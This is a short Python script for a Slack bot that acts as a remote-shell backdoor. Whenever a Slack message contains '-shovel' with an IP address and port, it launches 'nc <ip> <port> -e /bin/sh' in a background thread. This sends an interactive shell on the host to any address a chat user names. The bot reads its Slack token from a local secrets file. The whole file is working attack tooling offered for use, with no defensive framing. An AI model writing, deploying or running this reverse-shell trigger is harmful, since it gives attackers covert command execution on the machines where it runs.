import os
import ssl as ssl_lib
from slack import RTMClient
import subprocess
import threading

def call_subprocess(ip, port):
  subprocess.Popen(["nc",ip,port,"-e","/bin/sh"])

@RTMClient.run_on(event="message")
def shovel_shell(**payload):
  data = payload['data']
  web_client = payload['web_client']
  if 'text' in data and '-shovel' in data['text']:
    user = data['user']
    args = data['text'].split(' ')
    if len(args) == 3:
        ip = args[1]
        port = args[2]
        print("Shoveling a shell for @"+user+" to "+ip+":"+port+"!")
        try:
            shell_thread = threading.Thread(target=call_subprocess, args=(ip,port))
            shell_thread.start()
        except:
            print("Error processing request for "+ip+":"+port+"!")

secrets_file = open('secrets.txt','r')
slack_token = secrets_file.readline()
rtm_client = RTMClient(
  token=slack_token,
  connect_method='rtm.start',
  ssl=True
)
rtm_client.start()